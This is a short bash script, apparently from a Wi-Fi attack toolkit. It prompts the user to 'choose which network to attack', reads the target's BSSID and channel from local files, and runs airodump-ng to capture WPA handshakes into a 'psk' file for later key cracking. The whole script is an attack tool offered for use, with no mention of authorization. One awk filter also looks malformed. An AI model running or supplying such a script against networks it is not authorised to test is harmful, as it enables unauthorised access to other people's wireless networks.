#!/bin/bash

rm -rf *.cap

echo "Choose which network to attack."
cat network-list.txt

read -r input

ssid=$(awk -v pat="$input" -F ":" '$0~pat{print $2}' network-list.txt)
#echo $ssid
awk -v pat="$ssid" -F" " '$0~patFNR<7{print $2" "$3}' networks.txt > combined.txt
interface=$(cat interfaceToUse.txt)
targetChannel=$(awk -F " " 'FNR<2{print $2}' combined.txt)
targetBSSID=$(awk -F " " 'FNR<2{print $1}' combined.txt)

#echo $interface
#echo $targetChannel
#echo $targetBSSID

airodump-ng -c $targetChannel --bssid $targetBSSID -w psk $interface
